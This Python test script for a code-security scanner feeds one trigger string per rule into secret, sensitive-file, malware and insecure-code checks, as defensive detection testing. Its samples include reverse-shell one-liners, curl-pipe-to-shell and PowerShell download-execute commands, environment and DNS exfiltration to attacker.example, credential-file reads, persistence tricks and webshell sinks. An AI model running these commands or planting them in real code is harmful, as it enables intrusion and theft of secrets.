#!/usr/bin/env python3
"""Completeness test: every rule in every check must fire on a sample.

Runs one triggering sample per rule through its check and asserts the rule is
detected at its declared severity. Fails (exit 1) if ANY rule is uncovered —
so new rules can't be added without a test, and regressions are caught.

    python3 tests/validate_rules.py
"""
import os
import sys
from pathlib import Path

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts"))
from scan.checks import ALL  # noqa: E402

A36 = "a" * 36

# One triggering sample per rule id. Secrets use realistic-length fake values.
SAMPLES = {
    # ---------------- secrets ----------------
    "secrets.aws_access_key":  'k="AKIA' + "IOSFODNN7EXAMPLE" + '"',  # split: avoid GH push-protection
    "secrets.gcp_api_key":     'k="AIza' + "A" * 35 + '"',
    "secrets.gcp_oauth":       'k="ya29.A0ARrdaM' + "a" * 20 + '"',
    "secrets.github_pat":      'k="ghp_' + A36 + '"',
    "secrets.github_fine_pat": 'k="github_pat_' + "A" * 60 + '"',
    "secrets.slack_token":     'k="xox' + "b-1234567890-abcdefghij" + '"',
    "secrets.slack_webhook":   "https://hooks.slack.com/services/" + "T00000000/B00000000/" + "X" * 24,
    "secrets.stripe_secret":   'k="sk_live_' + "a" * 24 + '"',
    "secrets.stripe_pub":      'k="pk_live_' + "a" * 24 + '"',
    "secrets.twilio_sid":      'k="AC' + "0" * 32 + '"',
    "secrets.sendgrid":        'k="SG.' + "A" * 22 + "." + "A" * 43 + '"',
    "secrets.mailgun":         'k="key-' + "a" * 32 + '"',
    "secrets.npm_token":       'k="npm_' + "a" * 36 + '"',
    "secrets.pypi_token":      'k="pypi-AgEIcHlwaS' + "a" * 50 + '"',
    "secrets.openai":          'k="sk-' + "a" * 24 + '"',
    "secrets.anthropic":       'k="sk-ant-' + "a" * 30 + '"',
    "secrets.telegram_bot":    'k="123456789:' + "A" * 35 + '"',
    "secrets.square":          'k="sq0atp-' + "a" * 22 + '"',
    "secrets.shopify":         'k="shpat_' + "0" * 32 + '"',
    "secrets.private_key":     '-----BEGIN PRIVATE KEY-----',
    "secrets.jwt":             "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" + "." + "eyJzdWIiOiIxMjM0NTY3ODkwIn0" + "." + "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV",
    "secrets.db_uri_creds":    'u="postgres://user:secretpass@host:5432/db"',
    "secrets.npmrc_token":     '//registry.npmjs.org/:_authToken=abcdef1234567890',
    "secrets.gitlab_pat":      'k="glpat-' + "a" * 20 + '"',
    "secrets.gcp_sa_json":     '"type": "service_account"',
    "secrets.heroku":          'heroku_api_key=12345678-1234-1234-1234-123456789012',
    "secrets.digitalocean":    'k="dop_v1_' + "a" * 64 + '"',
    "secrets.discord_token":   "MTk4NjIy" + "NDgzNDcxOTI1MjQ4" + ".Gabc12." + "abcdefghijklmnopqrstuvwxyz1234567",
    "secrets.discord_webhook": "https://discord.com/api/webhooks/" + "123456789012345678/" + "abcdefABCDEF-_ghijkl",
    "secrets.cloudflare":      'k="v1.0-' + "a" * 20 + "-" + "b" * 40 + '"',
    "secrets.azure_storage":   'AccountKey=' + "A" * 80 + '==',
    "secrets.datadog":         'dd_api_key=' + "a" * 32,
    "secrets.aws_secret_ctx":  'aws_secret_access_key = "' + "abcdEFGH1234" * 3 + "abcd" + '"',
    "secrets.bearer_token":    'Authorization: Bearer abcdefghij1234567890ABCDEFGHIJ',
    "secrets.generic":         'password = "Xy9kL2mNp4qRs7wT"',

    # ---------------- sensitive_files (sample == filename) ----------------
    "sensitive_files.dotenv":        ".env",
    "sensitive_files.private_key":   "server.pem",
    "sensitive_files.ssh_key":       "id_rsa",
    "sensitive_files.pkcs12":        "keystore.p12",
    "sensitive_files.putty_key":     "key.ppk",
    "sensitive_files.npmrc":         ".npmrc",
    "sensitive_files.pypirc":        ".pypirc",
    "sensitive_files.netrc":         ".netrc",
    "sensitive_files.htpasswd":      ".htpasswd",
    "sensitive_files.gcp_sa":        "my-service-account.json",
    "sensitive_files.aws_creds":     "credentials",
    "sensitive_files.kube":          "kubeconfig",
    "sensitive_files.pkcs8":         "cert.der",
    "sensitive_files.ovpn":          "client.ovpn",
    "sensitive_files.keepass":       "db.kdbx",
    "sensitive_files.pgp_secret":    "secring.gpg",
    "sensitive_files.tfstate":       "terraform.tfstate",
    "sensitive_files.docker_cfg":    ".dockercfg",
    "sensitive_files.git_creds":     ".git-credentials",
    "sensitive_files.wp_config":     "wp-config.php",
    "sensitive_files.rails_secrets": "secrets.yml",
    "sensitive_files.history":       ".bash_history",

    # ---------------- malware ----------------
    "malware.js_global_require": 'global["x"] = require("fs");',
    "malware.js_global_module":  'global["y"] = module;',
    "malware.fromcharcode_del":  'String.fromCharCode(127)',
    "malware.charat_permute":    'key.charAt(i) % 26',
    "malware.dynamic_lookup":    'var f = obj[k]; r = f(a, dec(b));',
    "malware.eval_base64_decode": 'eval(base64_decode($x))',
    "malware.eval_atob":         'eval(atob("x"))',
    "malware.new_function_str":  'new Function("return 1")',
    "malware.py_exec_compile":   'exec(compile(s,"f","exec"))',
    "malware.ruby_eval_b64":     'eval(Base64.decode64(d))',
    "malware.marshal_load":      'Marshal.load(b)',
    "malware.bash_revshell":     'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    "malware.nc_revshell":       'nc -e /bin/sh 10.0.0.1 4444',
    "malware.py_revshell":       's.connect(("h",9)); os.dup2(s.fileno(),0); subprocess.call(["/bin/sh"])',
    "malware.py_revshell2":      'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); import subprocess',
    "malware.curl_pipe_sh":      'curl http://x/i | sh',
    "malware.crypto_miner":      'pool = "stratum+tcp://xmrig.pool:3333"',
    "malware.php_webshell":      'if ($_GET["c"]) system("id");',
    "malware.ruby_open_pipe":    'open("| id")',
    "malware.npm_lifecycle_curl": '"postinstall": "curl http://x | sh"',
    "malware.gem_git_url":       'gem "x", :git => "https://x/x.git"',
    "malware.c2_domain":         'cb = "https://webhook.site/abc"',
    "malware.authorized_keys":   'echo k >> authorized_keys',
    "malware.cron_tamper":       'crontab -r',
    "malware.revshell_devtcp":   'exec 5<>/dev/tcp/10.0.0.1/4444',
    "malware.nc_mkfifo":         'mkfifo /tmp/f; nc 10.0.0.1 9001 < /tmp/f | /bin/sh > /tmp/f',
    "malware.perl_revshell":     'use Socket; connect(S, sockaddr_in($p,$i)); exec("/bin/sh -i");',
    "malware.ruby_revshell":     'TCPSocket.new("h",1); exec("/bin/sh")',
    "malware.php_revshell":      'fsockopen("h",1); exec("/bin/sh");',
    "malware.powershell_revshell": '$c=New-Object System.Net.Sockets.TCPClient("h",1)',
    "malware.socat_revshell":    'socat TCP:host:1 EXEC:/bin/sh',
    "malware.py_pty_spawn":      'pty.spawn("/bin/sh")',
    "malware.awk_revshell":      'awk \'BEGIN{s="/inet/tcp/0/10.0.0.1/9001"}\'',
    "malware.lua_revshell":      'local s=require("socket"); os.execute("/bin/sh")',
    "malware.php_webshell_sink": 'system($_GET["cmd"]);',
    "malware.php_dynamic_call":  '$_GET["f"]("x");',
    "malware.php_var_call":      '$f=$_GET["f"]; $f($_GET["a"]);',
    "malware.php_eval_packer":   'eval(gzinflate(base64_decode("x")));',
    "malware.php_preg_e":        'preg_replace("/.*/e", $code, $s);',
    "malware.php_create_function": 'create_function("", $code);',
    "malware.jsp_runtime_exec":  'Runtime.getRuntime().exec(cmd)',
    "malware.aspx_request_exec": 'Process.Start(Request["cmd"])',
    "malware.download_exec":     'wget http://x/i | python',
    "malware.certutil_download": 'certutil -urlcache -split -f http://x x.exe',
    "malware.bitsadmin_download": 'bitsadmin /transfer j http://x x.exe',
    "malware.ps_download_iex":   'IEX (New-Object Net.WebClient).DownloadString("http://x")',
    "malware.ps_encoded_cmd":    'powershell -enc ' + "A" * 30,
    "malware.python_url_exec":   'data = requests.get("http://x").text; exec(data)',
    "malware.eval_buffer_from":  'eval(Buffer.from(x,"base64"))',
    "malware.eval_fromcharcode": 'eval(String.fromCharCode(97,98))',
    "malware.py_b64_exec":       'exec(base64.b64decode(x))',
    "malware.vbscript_wscript_shell": 'CreateObject("WScript.Shell").Run("calc")',
    "malware.npm_lifecycle_net": '"postinstall": "node -e require(\'x\')"',
    "malware.atob_to_sink":      'require(atob("ZnM="))',
    "malware.env_exfil":         'fetch(u, {body: JSON.stringify(process.env)})',
    "malware.dns_exfil":         'dns.lookup(data + ".attacker.example", cb)',
    "malware.creds_file_read":   'fs.readFileSync("/home/u/.ssh/id_rsa")',
    "malware.sendbeacon":        'navigator.sendBeacon("https://x", d)',
    "malware.pip_install_url":   'pip install https://evil.example/x.whl',
    "malware.npm_install_url":   'npm install https://evil.example/x.tgz',
    "malware.pkg_url_dependency": '"lodash": "git+https://evil.example/x.git"',
    "malware.setup_py_exec":     'cmdclass={"install": Run}\nos.system("curl http://evil.example | sh")',
    "malware.ld_preload":        'LD_PRELOAD=/tmp/x.so',
    "malware.rc_persist":        'echo x >> ~/.bashrc',
    "malware.systemd_persist":   'systemctl enable evil',
    "malware.hex_escapes":       '"' + r"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x50" + '"',
    "malware.octal_escapes":     '"' + r"\101" * 16 + '"',
    "malware.eof_marker":        "puts 1\n__END__\nbad_payload()",      # rel forced to .rb below
    "malware.hidden_whitespace": (" " * 220) + "x=1",
    "malware.long_line":         "#" + "A" * 600,
    "malware.entropy_string":    'x = "' + "aZ9bX2qW7eR4tY1uI8oP3sD6fG0hJ5kLpQ7" * 3 + '"',

    # ---------------- dangerous_code ----------------
    "dangerous_code.py_shell_injection":     'os.system(f"ls {x}")',
    "dangerous_code.subprocess_shell_true":  'subprocess.call(cmd, shell=True)',
    "dangerous_code.js_child_process_concat": 'exec("ls " + dir)',
    "dangerous_code.sql_concat":             'db.query("SELECT * FROM u WHERE id=" + uid)',
    "dangerous_code.py_pickle":              'pickle.loads(data)',
    "dangerous_code.py_yaml_load":           'yaml.load(data)',
    "dangerous_code.ruby_yaml_load":         'YAML.load(data)',
    "dangerous_code.ruby_send_user":         'obj.send(params[:m])',
    "dangerous_code.ruby_kernel_exec":       'Kernel.system("rm -rf x")',
    "dangerous_code.js_node_serialize":      'unserialize(data)',
    "dangerous_code.py_eval_exec":           'eval(user_input)',
    "dangerous_code.weak_hash":              'hashlib.md5(p)',
    "dangerous_code.weak_cipher":            'DES.new(key)',
    "dangerous_code.tls_verify_off":         'requests.get(u, verify=False)',
    "dangerous_code.flask_debug":            'app.run(debug=True)',
    "dangerous_code.disable_host_check":     'ALLOWED_HOSTS = ["*"]',
}

REL_OVERRIDE = {"malware.eof_marker": "fixture.rb"}


def main() -> int:
    passed, failed = [], []
    for mod in ALL:
        for rid, sev, _desc in mod.catalog():
            key = f"{mod.NAME}.{rid}"
            if key not in SAMPLES:
                failed.append((key, sev, "NO SAMPLE DEFINED"))
                continue
            sample = SAMPLES[key]
            if mod.NAME == "sensitive_files":
                rel, text = sample, ""
            else:
                rel, text = REL_OVERRIDE.get(key, "fixture.txt"), sample
            findings = mod.check(Path(rel), rel, text, text.splitlines(), set())
            hit = next((f for f in findings if (f.detail or "").split()[0] == rid), None)
            if not hit:
                failed.append((key, sev, "NOT DETECTED"))
            elif hit.severity != sev:
                failed.append((key, sev, f"severity mismatch: got {hit.severity}"))
            else:
                passed.append((key, sev))

    total = len(passed) + len(failed)
    print(f"\nRule coverage: {len(passed)}/{total} rules validated\n")
    blocks = sum(1 for _, s in passed if s in ("high", "critical"))
    warns = sum(1 for _, s in passed if s == "warn")
    print(f"  BLOCK (high/critical): {blocks}    WARN: {warns}\n")
    if failed:
        print("FAILURES:")
        for key, sev, why in failed:
            print(f"  ✗ {key}  [{sev}]  — {why}")
        return 1
    print("✓ every rule fires at its declared severity")
    return 0


if __name__ == "__main__":
    sys.exit(main())
